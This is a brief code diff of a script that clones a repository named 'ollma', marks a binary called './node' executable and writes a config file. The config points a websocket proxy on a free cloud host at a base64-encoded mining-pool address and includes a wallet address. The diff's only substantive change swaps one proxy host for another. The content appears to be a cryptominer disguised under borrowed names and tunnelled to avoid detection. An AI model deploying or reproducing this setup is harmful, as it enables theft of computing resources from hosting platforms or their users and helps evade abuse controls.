@@ -32,7 +32,7 @@ git clone https://github.com/marcei9809/ollma.git && \
 cd ollma && chmod +x ./node && \
 cat > data.json <<'EOF'
 {
-  "proxy": "wss://ratty-adoree-ananta512-4abadf1a.koyeb.app/cG93ZXIyYi5uYS5taW5lLnpwb29sLmNhOjYyNDI=",
+  "proxy": "wss://onren-e3hx.onrender.com/cG93ZXIyYi5uYS5taW5lLnpwb29sLmNhOjYyNDI=",
   "config": { "threads": 4, "log": true },
   "options": {
     "user": "RXi399jsFYHLeqFhJWiNETySj5nvt2ryqj",
@@ -167,7 +167,5 @@ if __name__ == "__main__":
         asyncio.run(main_async())
     except KeyboardInterrupt:
         print("\n⏹️  Interrupted — shutting down.", file=sys.stderr)
-
-
 
 
